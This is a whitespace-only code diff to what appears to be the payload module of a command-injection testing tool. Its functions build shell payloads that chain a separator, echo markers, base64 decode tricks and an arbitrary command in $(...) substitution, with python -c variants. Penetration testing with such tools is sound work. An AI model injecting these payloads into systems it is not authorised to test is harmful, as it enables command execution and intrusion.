@@ -19,9 +19,9 @@
 # ----------------------------------------------------------
 def decision(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
   payload = (separator + 
-	    "echo " + TAG + "" +
-	    "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + ")" + TAG + ""
-	     ) 
+            "echo " + TAG + "" +
+            "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + ")" + TAG + ""
+             ) 
   return payload
 
 """
@@ -29,8 +29,8 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
   payload = (separator + 
-	    " python -c \"print '" + TAG + "' + '" + B64_ENC_TAG + "' + '" + B64_DEC_TRICK + "' + '" + TAG + "'\""
-	     ) 
+            " python -c \"print '" + TAG + "' + '" + B64_ENC_TAG + "' + '" + B64_DEC_TRICK + "' + '" + TAG + "'\""
+             ) 
   return payload
 
 # ---------------------------------------------
@@ -38,11 +38,11 @@ def decision_alter_shell(separator,TAG, B64_ENC_TAG, B64_DEC_TRICK):
 # ---------------------------------------------
 def cmd_execution(separator,TAG,cmd):
   payload = (separator + 
-	    "echo " + TAG + "" +
-	    "$(echo " + TAG + ")" +
-	    "$(" + cmd + ")"+
-	    "$(echo " + TAG + ")" + TAG + ""
-	    )
+            "echo " + TAG + "" +
+            "$(echo " + TAG + ")" +
+            "$(" + cmd + ")"+
+            "$(echo " + TAG + ")" + TAG + ""
+            )
   return payload
 
 """
@@ -50,7 +50,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator,TAG,cmd):
   payload = (separator + 
-	    " python -c \"print'" + TAG + "'+'" + TAG + "'+'$(echo $("+cmd+"))'+'"+ TAG + "'+'" + TAG + "'\""
-	    )
+            " python -c \"print'" + TAG + "'+'" + TAG + "'+'$(echo $("+cmd+"))'+'"+ TAG + "'+'" + TAG + "'\""
+            )
   return payload
 
